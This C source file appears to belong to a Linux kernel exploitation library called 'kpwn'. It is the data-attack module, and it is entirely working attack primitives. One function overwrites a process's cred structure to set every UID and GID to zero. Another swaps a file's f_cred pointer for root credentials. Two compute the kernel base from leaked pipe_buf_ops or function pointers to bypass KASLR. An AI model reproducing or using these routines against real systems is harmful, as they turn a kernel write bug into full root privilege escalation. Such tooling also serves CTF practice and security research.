#define _GNU_SOURCE

#include <kpwn/data_attack.h>
#include <kpwn/logger.h>
#include <kpwn/utils.h>
#include <string.h>

int kpwn_cred_patch_uid0(uint64_t cred_addr, kpwn_kwrite_fn write_fn,
                         void *ctx) {
  // Zero out uid/gid/suid/sgid/euid/egid/fsuid/fsgid (8 × uint32_t at
  // offsets 0x04..0x20)
  uint32_t zero = 0;
  int ret = 0;

  struct {
    size_t off;
    const char *name;
  } fields[] = {
      {0x04, "uid"},  {0x08, "gid"},  {0x0c, "suid"},  {0x10, "sgid"},
      {0x14, "euid"}, {0x18, "egid"}, {0x1c, "fsuid"}, {0x20, "fsgid"},
  };

  for (size_t i = 0; i < sizeof(fields) / sizeof(fields[0]); i++) {
    int r = write_fn(cred_addr + fields[i].off, &zero, sizeof(zero), ctx);
    if (r != 0) {
      log_error("[kpwn:data] cred_patch %s failed at 0x%lx", fields[i].name,
                cred_addr + fields[i].off);
      ret = r;
    }
  }

  if (ret == 0)
    log_success("[kpwn:data] cred_patch_uid0 at 0x%lx: all IDs zeroed",
                cred_addr);
  return ret;
}

int kpwn_file_replace_f_cred(uint64_t file_addr, uint64_t root_cred_addr,
                             size_t f_cred_off, kpwn_kwrite_fn write_fn,
                             void *ctx) {
  int ret = write_fn(file_addr + f_cred_off, &root_cred_addr,
                     sizeof(root_cred_addr), ctx);
  if (ret == 0)
    log_success("[kpwn:data] file f_cred replaced at 0x%lx+0x%lx -> 0x%lx",
                file_addr, f_cred_off, root_cred_addr);
  else
    log_error("[kpwn:data] file f_cred replace failed");
  return ret;
}

uint64_t kpwn_kaslr_from_pipe_ops(uint64_t leaked_ops,
                                  uint64_t anon_pipe_buf_ops_off) {
  uint64_t kbase = leaked_ops - anon_pipe_buf_ops_off;
  log_success("[kpwn:data] kbase from pipe_ops: 0x%lx - 0x%lx = 0x%lx",
              leaked_ops, anon_pipe_buf_ops_off, kbase);
  return kbase;
}

uint64_t kpwn_kaslr_from_func_ptr(uint64_t leaked_ptr, uint64_t known_sym_off) {
  uint64_t kbase = leaked_ptr - known_sym_off;
  log_success("[kpwn:data] kbase from func_ptr: 0x%lx - 0x%lx = 0x%lx",
              leaked_ptr, known_sym_off, kbase);
  return kbase;
}
